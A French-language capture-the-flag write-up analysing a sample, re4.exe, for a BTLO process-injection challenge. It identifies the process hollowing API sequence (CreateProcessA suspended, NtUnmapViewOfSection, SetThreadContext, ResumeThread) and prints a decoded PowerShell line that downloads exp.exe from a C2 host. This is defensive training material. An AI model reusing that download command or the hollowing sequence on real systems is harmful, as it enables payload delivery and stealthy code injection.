# 🔐 BTLO — Injection Series Part 4 | Writeup

## 📋 Scenario

> Reverse engineer the given file and understand the behavior. You can use any disassembler you like to complete this challenge.

**Fichiers fournis :**
```
re4.exe
```

---

## 🧠 Méthodologie

### Qu'est-ce que l'analyse statique ?

> L'analyse statique consiste à examiner un fichier malveillant sans l'exécuter, afin d'en comprendre le comportement à partir de son contenu brut (imports, strings, structure PE).

**Environnement utilisé :**

- REMnux (VM Linux) via VirtualBox avec dossier partagé en read-only
- Outils : `file`, `strings`, `base64`

---

## ❓ Questions & Réponses

### Q1 — What is the process that would be first spawned by the sample? And what is the API used? `(Format: process, APICall)`

**Réponse : `notepad.exe, CreateProcessA`**

Utilisation de `strings` pour extraire les chaînes du binaire :

```bash
strings re4.exe
```

> La question demandait "l'API utilisée pour spawner le processus" — le mot spawn = créer un processus.  
> La première API qui crée ce processus était `CreateProcessA`.  
> Présence de `c:\windows\syswow64\notepad.exe` et de l'import `CreateProcessA` de `KERNEL32.dll`.

| Règle | Explication |
|-------|-------------|
| DLL Windows | = APIs Windows |

---

### Q2 — The value 4 has been pushed as a parameter to this API, what does that denote? `(Format: FLAG)`

**Réponse : `CREATE_SUSPENDED`**

> La valeur `4` ou en hex `0x00000004` correspond au flag `CREATE_SUSPENDED` dans les `dwCreationFlags` de `CreateProcessA`. Le processus est créé en mode suspendu pour permettre l'injection de code avant son exécution.  
> Source : [Microsoft Docs — Process Creation Flags](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags)

---

### Q3 — What is the domain that the malware tries to connect? `(Format: domain.tld)`

**Réponse : `somec2.server`**

Découvert en décodant la commande PowerShell encodée en Base64 :

```bash
echo "SQBuAHYAbwBrAGUALQBX..." | base64 -d
```

Résultat :

```
Invoke-WebRequest -Uri http://somec2.server/exp.exe -OutFile c:\\windows\\temp\\exp.exe
```

---

### Q4 — What is the cmdlet used to download the file and what is the path of the file stored? `(Format: CMDLET, path)`

**Réponse : `Invoke-WebRequest, c:\\windows\\temp\\exp.exe`**

> La commande PowerShell décodée utilise le cmdlet `Invoke-WebRequest` pour télécharger `exp.exe` depuis le serveur C2 et le stocker dans le dossier temporaire Windows.

> Une cmdlet, abréviation de « command-let », est une commande spécialisée dans PowerShell, un langage de script et d'automatisation principalement utilisé dans les environnements Windows.  
> Source : [Lenovo — Qu'est-ce qu'une cmdlet ?](https://www.lenovo.com/fr/fr/glossary/cmdlet/)

---

### Q5 — Just after the file download instructions, a function from ntdll has been loaded and invoked by the sample. What is the function name? `(Format: Function)`

**Réponse : `NtUnmapViewOfSection`**

> Identifié dans les imports `ntdll.dll` via `strings`. Cette fonction est utilisée pour vider la mémoire du processus cible lors du **Process Hollowing**.

> Le Process Hollowing est une technique sophistiquée utilisée par les cyber-attaquants pour injecter des codes malveillants dans des processus légitimes s'exécutant sur un système informatique.  
> Source : [FriendlyCaptcha — What is Process Hollowing ?](https://friendlycaptcha.com/fr/wiki/what-is-process-hollowing/)

---

### Q6 — After the allocation of memory and writing the data into the allocated memory. What are the 2 APIs used to update the entry point and resume the thread? `(Format: API, API)`

**Réponse : `SetThreadContext, ResumeThread`**

Identifiés dans les imports `KERNEL32.dll` :

| API | Rôle |
|-----|------|
| `SetThreadContext` | Met à jour le point d'entrée du thread |
| `ResumeThread` | Reprend l'exécution du processus injecté |

---

### Q7 — What is the MITRE ID for this technique implemented in this sample? `(Format: TXXXX.XXX)`

**Réponse : `T1055.012`**

> Le Process Hollowing est répertorié dans le framework MITRE ATT&CK sous la technique d'injection de processus.  
> Source : [MITRE ATT&CK](https://attack.mitre.org/)

---

## 🛠️ Outils utilisés

| Outil | Usage |
|-------|-------|
| `strings` | Extraction des chaînes du binaire |
| `base64` | Décodage de la commande PowerShell obfusquée |
| `file` | Identification du type de fichier |
| [MITRE ATT&CK](https://attack.mitre.org) | Référence des techniques d'attaque |

---

## 💡 Concepts clés appris

| Concept | Définition |
|---------|------------|
| **PE32** | Format d'exécutable Windows 32-bit |
| **Process Hollowing** | Injection de code dans un processus légitime suspendu |
| **Serveur C2** | Serveur Command & Control de l'attaquant |
| **Base64 PowerShell** | Technique d'obfuscation de commandes malveillantes |
| **CREATE_SUSPENDED** | Flag créant un processus en pause pour permettre l'injection |

---

## 📚 Ressources

- [Microsoft Docs — Process Creation Flags](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags)
- [FriendlyCaptcha — What is Process Hollowing ?](https://friendlycaptcha.com/fr/wiki/what-is-process-hollowing/)
- [Lenovo — Qu'est-ce qu'une cmdlet ?](https://www.lenovo.com/fr/fr/glossary/cmdlet/)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [Commandes Linux](https://blog.stephane-robert.info/docs/admin-serveurs/linux/commandes/)
